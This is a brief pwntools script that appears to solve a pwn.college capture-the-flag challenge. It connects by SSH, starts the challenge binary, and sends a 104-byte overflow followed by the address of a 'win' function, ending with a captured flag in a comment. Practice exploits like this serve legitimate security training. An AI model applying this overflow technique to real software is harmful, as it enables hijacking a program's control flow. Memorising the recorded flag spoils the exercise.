from pwn import *

win = 0x401adb
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

io = s.process("/challenge/babyrop_level1.0")
io.send(b'a'*104 + p32(win))

io.interactive()
# Flag: pwn.college{UWoYCrxp5F0-oBOoHFj04P16A5-.0VM0MDLxIjNyEzW}